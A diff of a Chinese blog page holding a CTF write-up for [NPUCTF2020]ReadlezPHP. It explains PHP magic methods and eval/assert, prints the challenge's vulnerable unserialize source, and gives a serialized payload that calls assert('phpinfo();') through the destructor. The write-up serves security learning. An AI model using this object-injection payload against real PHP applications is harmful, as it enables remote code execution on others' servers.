@@ -1,266 +1,166 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
-  <link rel="mask-icon" href="/images/tu.ico" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="知识加固__construct()__construct()函数：在创建对象时被调用。是在调用反序列化函数那刻，对象就被创建了，同时调用了construct魔法函数，而给对象属性赋值发生在更后面，所以，就算construct函数里面有一些赋值操作，这也并不影响我们传值。当然同理__destruct()就是摧毁前的最后一步而已。 eval和assert二者都可以执行PHP语句。只不过是，eval规范">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[NPUCTF2020]ReadlezPHP | 信安小蚂蚁</title><meta name="author" content="信安小蚂蚁"><meta name="copyright" content="信安小蚂蚁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="知识加固__construct()__construct()函数：在创建对象时被调用。是在调用反序列化函数那刻，对象就被创建了，同时调用了construct魔法函数，而给对象属性赋值发生在更后面，所以，就算construct函数里面有一些赋值操作，这也并不影响我们传值。当然同理__destruct()就是摧毁前的最后一步而已。 eval和assert二者都可以执行PHP语句。只不过是，eval规范">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[NPUCTF2020]ReadlezPHP">
 <meta property="og:url" content="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/index.html">
 <meta property="og:site_name" content="信安小蚂蚁">
 <meta property="og:description" content="知识加固__construct()__construct()函数：在创建对象时被调用。是在调用反序列化函数那刻，对象就被创建了，同时调用了construct魔法函数，而给对象属性赋值发生在更后面，所以，就算construct函数里面有一些赋值操作，这也并不影响我们传值。当然同理__destruct()就是摧毁前的最后一步而已。 eval和assert二者都可以执行PHP语句。只不过是，eval规范">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg">
+<meta property="og:image" content="https://mayi077.github.io/images/1.jpg">
 <meta property="article:published_time" content="2020-05-06T13:40:05.000Z">
 <meta property="article:modified_time" content="2020-05-06T13:41:03.000Z">
 <meta property="article:author" content="信安小蚂蚁">
 <meta property="article:tag" content="buuctf">
 <meta property="article:tag" content="序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg">
-
-<link rel="canonical" href="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
-
-  <title>[NPUCTF2020]ReadlezPHP | 信安小蚂蚁</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">信安小蚂蚁</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
-  <div class="site-nav-right"></div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-主页">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
-
-  </li>
-        <li class="menu-item menu-item-归档">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-分类">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-标签">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-关于">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
+<meta name="twitter:image" content="https://mayi077.github.io/images/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[NPUCTF2020]ReadlezPHP",
+  "url": "https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/",
+  "image": "https://mayi077.github.io/images/1.jpg",
+  "datePublished": "2020-05-06T13:40:05.000Z",
+  "dateModified": "2020-05-06T13:41:03.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "信安小蚂蚁",
+      "url": "https://mayi077.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
       
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          [NPUCTF2020]ReadlezPHP
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-05-06 21:40:05 / 修改时间：21:41:03" itemprop="dateCreated datePublished" datetime="2020-05-06T21:40:05+08:00">2020-05-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF复现</span>
-                  </a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <h3 id="知识加固"><a href="#知识加固" class="headerlink" title="知识加固"></a>知识加固</h3><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>函数：在创建对象时被调用。是在调用反序列化函数那刻，对象就被创建了，同时调用了<strong>construct魔法函数，而给对象属性赋值发生在更后面，所以，就算</strong>construct函数里面有一些赋值操作，这也并不影响我们传值。<br>当然同理<code>__destruct()</code>就是摧毁前的最后一步而已。</p>
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[NPUCTF2020]ReadlezPHP',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">信安小蚂蚁</span></a><a class="nav-page-title" href="/"><span class="site-name">[NPUCTF2020]ReadlezPHP</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">[NPUCTF2020]ReadlezPHP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-06T13:40:05.000Z" title="发表于 2020-05-06 21:40:05">2020-05-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-05-06T13:41:03.000Z" title="更新于 2020-05-06 21:41:03">2020-05-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%A4%8D%E7%8E%B0/">CTF复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="知识加固"><a href="#知识加固" class="headerlink" title="知识加固"></a>知识加固</h3><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>函数：在创建对象时被调用。是在调用反序列化函数那刻，对象就被创建了，同时调用了<strong>construct魔法函数，而给对象属性赋值发生在更后面，所以，就算</strong>construct函数里面有一些赋值操作，这也并不影响我们传值。<br>当然同理<code>__destruct()</code>就是摧毁前的最后一步而已。</p>
 <h4 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a>eval和assert</h4><p>二者都可以执行PHP语句。只不过是，eval规范更加严格一些，必须符合PHP代码要求。而assert则没有那么严格，执行PHP表达式即可。</p>
 <h5 id="eval定义和用法"><a href="#eval定义和用法" class="headerlink" title="eval定义和用法"></a>eval定义和用法</h5><p>函数把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码，且<strong>必须以分号结尾</strong>。<br>如eval(“echo 1;”)</p>
 <ul>
@@ -270,283 +170,14 @@
 </ul>
 <h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>&emsp;功能是判断一个表达式是否成立，返回true or false，重点是函数会执行此表达式。如果表达式为函数如assert(“echo(1)”)，则会输出1，而如果为assert(“echo 1;”)则不会有输出。</p>
 <h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li>打开题目查看源码发现指向<code>./time.php?source</code>的隐藏a标签，我们直接访问可以得到一个源码。如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure></li>
+<li>打开题目查看源码发现指向<code>./time.php?source</code>的隐藏a标签，我们直接访问可以得到一个源码。如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure></li>
 <li>很显然我们可以利用反序列化来执行命令或函数，经测试发现assert可用，且执行phpinfo()即可得到flag。</li>
-<li>我们输入执行以下代码得到payload：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a&#x3D;&quot;phpinfo();&quot;;</span><br><span class="line">    public $b&#x3D;&quot;assert&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp; </span><br><span class="line">echo urlencode(serialize($c));</span><br></pre></td></tr></table></figure>
-最后payload为;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;time.php?data&#x3D;O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A10%3A&quot;phpinfo()%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;</span><br></pre></td></tr></table></figure>
-然后在这个phpinfo页面搜索<code>flag{</code>就可以看到flag了。<br><a href="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg" alt=""></a></li>
+<li>我们输入执行以下代码得到payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a=&quot;phpinfo();&quot;;</span><br><span class="line">    public $b=&quot;assert&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp; </span><br><span class="line">echo urlencode(serialize($c));</span><br></pre></td></tr></table></figure>
+最后payload为;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A10%3A&quot;phpinfo()%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;</span><br></pre></td></tr></table></figure>
+然后在这个phpinfo页面搜索<code>flag&#123;</code>就可以看到flag了。<br><a target="_blank" rel="noopener" href="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg"><img src="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg" alt=""></a></li>
 </ol>
-
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>信安小蚂蚁
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/" title="[NPUCTF2020]ReadlezPHP">https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-     <div>
-       
-         ﻿<div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-         
-      </div>
-
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/buuctf/" rel="tag"><i class="fa fa-tag"></i>buuctf</a>
-              <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i>序列化</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/05/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%89%B9%E5%AE%9A%E5%9C%BA%E5%90%88%E4%B8%8Baddslashes%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87/" rel="prev" title="代码审计--特定场合下addslashes函数的绕过">
-      <i class="fa fa-chevron-left"></i> 代码审计--特定场合下addslashes函数的绕过
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/05/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%8E%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%88%B0getshell/" rel="next" title="代码审计--从变量覆盖到getshell">
-      代码审计--从变量覆盖到getshell <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-    <div class="comments" id="gitalk-container"></div>
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识加固"><span class="nav-number">1.</span> <span class="nav-text">知识加固</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#construct"><span class="nav-number">1.1.</span> <span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval和assert"><span class="nav-number">1.2.</span> <span class="nav-text">eval和assert</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#eval定义和用法"><span class="nav-number">1.2.1.</span> <span class="nav-text">eval定义和用法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#assert函数"><span class="nav-number">1.2.2.</span> <span class="nav-text">assert函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
-      src="/images/1.jpg">
-  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives">
-          <span class="site-state-item-count">135</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-        <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">86</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
